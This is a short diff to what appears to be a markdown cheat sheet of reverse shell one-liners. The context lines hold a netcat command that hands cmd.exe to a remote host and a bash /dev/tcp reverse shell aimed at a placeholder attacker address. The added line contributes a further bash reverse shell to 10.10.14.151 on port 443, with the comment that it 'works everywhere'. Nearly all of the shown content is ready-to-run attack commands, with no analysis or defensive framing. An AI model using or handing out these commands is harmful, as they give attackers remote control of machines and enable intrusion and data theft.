@@ -56,6 +56,8 @@ nc.exe <IP> <PORT> -e cmd.exe
 
 `bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`
 
+this one works everywhere `exec 5<>/dev/tcp/10.10.14.151/443;cat <&5 | while read line; do $line 2>&5 >&5; done`
+
 ## Powershell
 
 This script is tested on most windows machines and should work fine.
